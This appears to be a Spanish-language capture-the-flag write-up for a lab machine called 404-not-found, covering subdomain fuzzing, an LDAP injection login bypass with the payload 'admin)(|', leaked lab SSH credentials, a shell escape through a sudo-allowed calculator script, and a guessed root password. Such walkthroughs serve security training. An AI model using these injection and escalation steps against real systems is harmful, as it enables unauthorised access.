## Reconocimiento:

Puerto 22 : ssh

puerto 80 : http 

Hay un dominio : 

```bash
http://404-not-found.hl
```

Y haciendo fuzzing encuentro un subdominio:

```bash
http://info.404-not-found.hl
```

Hay un panel de login.

No es posible la injección SQL, pero en el código hay un mensaje:

“I believe this login works with LDAP”

Es vulnerable a un Bypass de LDAP

```bash
USER = admin)(|
PASS = admin)(|
```

Y nos revela las credneciales ssh

USER = 404-page

PASS = not-found-page-secret

## Escalada 404-page → 200-ok

```bash
sudo -l
(220-ok : 200-ok) /home/404-page/calculator.py
```

El script funciona como calculadora normal, pero si buscamos en el sistema encontramos un archivo. 

```bash
cat /var/www/nota.txt
```

Info:

“In the calculator I don't know what the symbol is used for "!" followed by something else, only 200-ok knows.”

Dándonos una pista para la escalada.

```bash
sudo -u 200-ok /home/404-page/calculator.py
#Dentro del script
!ls -la
```

Vemos que al ejecutar un comando despues del signo nos lo ejecuta bien, así que aprovecho y ejecuto una bash.

```bash
sudo -u 200-ok /home/404-page/calculator.py

#Dentro del script
!bash
```

## Escalada 200-ok → root

En el directorio de 200-ok hay un archivo llamado boss.txt

```bash
cat boss.txt
```

info:

“What s rootebale”

Pruebo “rooteable” como contraseña root y funciona 

ya somos root.
